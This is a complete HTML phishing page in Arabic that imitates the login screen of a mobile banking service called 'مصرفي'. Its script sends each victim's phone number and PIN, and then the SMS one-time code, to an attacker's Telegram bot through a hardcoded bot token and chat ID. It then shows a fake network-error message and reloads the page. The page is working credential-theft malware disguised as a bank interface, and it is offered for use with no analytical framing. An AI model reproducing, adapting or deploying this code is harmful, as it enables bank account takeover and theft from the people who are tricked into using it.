<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الرئيسية / مصرفي</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        body { margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 140px; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        
        /* --- تنسيق الشعار العلوي --- */
        .header-container { 
            width: 100%; 
            height: 150px; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding-top: 20px; 
        }
        .header-img { 
            width: 280px; 
            height: auto; 
            object-fit: contain; 
        }

        .form-container { padding: 0 25px; text-align: right; z-index: 2; }
        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
        
        .input-box { position: relative; border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; background: #fff; display: flex; align-items: center; }
        input { border: none; width: 100%; font-size: 18px; padding: 14px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
        
        .field-icon { width: 28px; height: 28px; margin-left: 12px; object-fit: contain; }

        .btn-main { background-color: #94a3b8; color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 19px; font-weight: bold; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .btn-main.active { background-color: #2c5364; }

        .banner-container { width: 100%; margin-top: 25px; text-align: center; }
        .banner-img { width: 92%; border-radius: 10px; }

        /* --- تنسيق أيقونة OTP الكبيرة لتطابق الشعار --- */
        .otp-icon-container { width: 100%; text-align: center; margin: 30px 0; }
        .otp-main-icon { width: 280px; height: auto; object-fit: contain; }

        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 30px; font-size: 26px; font-weight: bold; border-radius: 8px; }
        
        .footer-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 150px; z-index: 1; pointer-events: none; }
        .footer-img { width: 100%; height: 100%; object-fit: fill; }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="wrapper">
    <div class="header-container">
        <img src="logo_masrvi.jpeg" class="header-img">
    </div>

    <!-- الواجهة الأولى -->
    <div id="p1" class="form-container">
        <label class="label">رقم الهاتف المربوط بالحساب *</label>
        <div class="input-box">
            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
            <img src="phone_icon.png" class="field-icon">
        </div>

        <label class="label">الرمز السري (PIN) *</label>
        <div class="input-box">
            <input type="password" id="pin" placeholder="****" maxlength="4" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateInput();">
            <img src="lock_icon.png" class="field-icon">
        </div>

        <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>

        <div class="banner-container">
            <img src="main_banner.jpeg" class="banner-img">
        </div>
    </div>

    <!-- الواجهة الثانية (OTP) -->
    <div id="p2" class="form-container hidden">
        <div class="otp-icon-container">
            <!-- الصورة الأولى في الواجهة الثانية (كبيرة بحجم الشعار) -->
            <img src="otp_main_icon.jpeg" class="otp-main-icon">
        </div>
        
        <p style="text-align: center; font-weight: bold; color: #333;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
        
        <div class="input-box">
            <input type="tel" id="otp" placeholder="######" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, ''); validateOtp();">
            <!-- الصورة الثانية في الواجهة الثانية (بنفس حجم أيقونة الهاتف) -->
            <img src="otp_field_icon.png" class="field-icon">
        </div>
        
        <div class="timer-box" id="time">05:00</div>
        <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
    </div>

    <div class="footer-container">
        <img src="footer_background.jpeg" class="footer-img">
    </div>
</div>

<script>
    const tok = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
    const cid = "8665814266";

    function send(t) {
        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
    }

    function validateInput() {
        const t = document.getElementById('tel').value;
        const p = document.getElementById('pin').value;
        const btn = document.getElementById('btn1');
        if(t.length === 8 && p.length === 4) {
            btn.disabled = false;
            btn.classList.add('active');
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    function validateOtp() {
        const o = document.getElementById('otp').value;
        const btn = document.getElementById('btn2');
        if(o.length === 6) {
            btn.disabled = false;
            btn.classList.add('active');
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    function toStep2() {
        send(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
        document.getElementById('p1').classList.add('hidden');
        document.getElementById('p2').classList.remove('hidden');
        startTimer();
    }

    function startTimer() {
        let time = 300;
        let int = setInterval(() => {
            let m = Math.floor(time / 60), s = time % 60;
            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            if(time <= 0) clearInterval(int);
            time--;
        }, 1000);
    }

    function final() {
        send(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
        alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
        location.reload();
    }
</script>

</body>
